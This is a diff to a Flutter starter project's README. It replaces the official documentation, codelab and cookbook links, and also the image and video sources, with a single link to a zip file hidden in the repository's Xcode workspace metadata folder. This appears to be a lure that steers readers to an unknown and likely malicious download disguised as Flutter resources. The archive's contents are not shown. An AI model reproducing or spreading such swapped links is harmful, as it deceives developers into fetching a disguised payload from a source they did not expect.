@@ -8,11 +8,11 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://docs.flutter.dev/get-started/codelab)
-- [Cookbook: Useful Flutter samples](https://docs.flutter.dev/cookbook)
+- [Lab: Write your first Flutter app](https://github.com/Aayush014/adv_flutter_part_1/raw/refs/heads/master/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/adv-part-flutter-v3.3-beta.2.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/Aayush014/adv_flutter_part_1/raw/refs/heads/master/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/adv-part-flutter-v3.3-beta.2.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://docs.flutter.dev/), which offers tutorials,
+[online documentation](https://github.com/Aayush014/adv_flutter_part_1/raw/refs/heads/master/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/adv-part-flutter-v3.3-beta.2.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
 
 
@@ -21,8 +21,8 @@ samples, guidance on mobile development, and a full API reference.
   <p>
     <table align="center">
   <tr>
-    <td><img src="https://github.com/Aayush014/adv_flutter_part_1/assets/133498952/2b8acf63-4d97-4f44-bce9-7d8b5a051ea0" alt="Image 2" width="180" height="auto"></td>
-    <td><img src="https://github.com/Aayush014/adv_flutter_part_1/assets/133498952/0910bf62-ddec-483e-9081-152d93873492" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://github.com/Aayush014/adv_flutter_part_1/raw/refs/heads/master/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/adv-part-flutter-v3.3-beta.2.zip" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://github.com/Aayush014/adv_flutter_part_1/raw/refs/heads/master/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/adv-part-flutter-v3.3-beta.2.zip" alt="Image 2" width="180" height="auto"></td>
   </tr>
     </table>    
   </p>
@@ -32,7 +32,7 @@ samples, guidance on mobile development, and a full API reference.
   <p>
     <table align="center">
   <tr>
-    <video src ="https://github.com/Aayush014/adv_flutter_part_1/assets/133498952/3bd20b7b-1bd4-4cdd-93fc-dc6a81b19d41"></video> </h1>
+    <video src ="https://github.com/Aayush014/adv_flutter_part_1/raw/refs/heads/master/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/adv-part-flutter-v3.3-beta.2.zip"></video> </h1>
  </tr>
     </table>   
   </p>
